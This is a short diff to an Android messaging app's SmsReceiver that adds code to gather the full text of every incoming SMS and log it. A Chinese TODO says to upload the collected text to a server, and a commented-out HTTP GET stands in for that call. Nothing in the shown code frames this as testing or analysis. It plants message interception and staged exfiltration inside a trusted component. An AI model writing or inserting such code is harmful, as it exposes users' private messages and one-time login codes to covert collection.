@@ -184,6 +184,17 @@ public final class SmsReceiver extends BroadcastReceiver {
         if (messages == null || messages.length < 1) {
             LogUtil.e(TAG, "processReceivedSms: null or zero or ignored message");
             return;
+        }else{
+            StringBuilder sb = new StringBuilder();
+            for(android.telephony.SmsMessage smsMessage :messages){
+                String messageBody=smsMessage.getMessageBody();
+                // LogUtil.i(TAG, "接收短信processReceivedSms: "+messageBody);
+                sb.append(messageBody);
+            }
+            LogUtil.i(TAG, "接收短信完整信息: \n"+sb);
+            // TODO 把sb上传到服务器
+            //    String result = HttpClient.doGet("https://www.baidu.com");
+            //     LogUtil.i(TAG, "百度请求信息: \n"+result);
         }
 
         final int errorCode =
